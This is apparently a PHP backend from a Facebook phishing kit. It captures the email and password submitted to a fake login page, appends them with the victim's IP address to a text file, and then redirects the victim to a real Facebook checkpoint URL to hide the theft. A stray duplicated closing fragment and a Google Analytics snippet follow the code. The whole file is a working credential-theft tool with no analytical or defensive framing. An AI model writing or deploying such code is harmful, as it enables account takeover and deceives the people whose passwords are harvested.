<?php
$file = "_______new_yudi__________.txt";
$email = $_POST['email'];
$pass = $_POST['pass'];
$ip = $_SERVER['REMOTE_ADDR'];



$handle = fopen($file, 'a');
fwrite($handle, "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~");
fwrite($handle, "\n");
fwrite($handle, "::  EMAIL     ::   ");
fwrite($handle, "$email");
fwrite($handle, "\n");
fwrite($handle, "::  PASSWORD  ::   ");
fwrite($handle, "$pass");
fwrite($handle, "\n");
fwrite($handle, "::  IP        ::   ");
fwrite($handle, "$ip");
fwrite($handle, "\n");
fclose($handle);
echo "<script images=\"JavaScript\">
<!--
window.location=\"https://www.facebook.com/checkpoint/828281030927956/?next=https%3A%2F%2Fwww.facebook.com%2Fhome.php?=10065877425?fb_source=bookmark_apps&ref=bookmarks&count=0&fb_bmpos=login_failed\";
// -->
</script>";
?>
// -->
</script>";
?>
<script type="text/javascript">

  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-33910177-1']);
  _gaq.push(['_setDomainName', 'x90x.net']);
  _gaq.push(['_setAllowLinker', true]);
  _gaq.push(['_trackPageview']);

  (function() {
    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();

</script>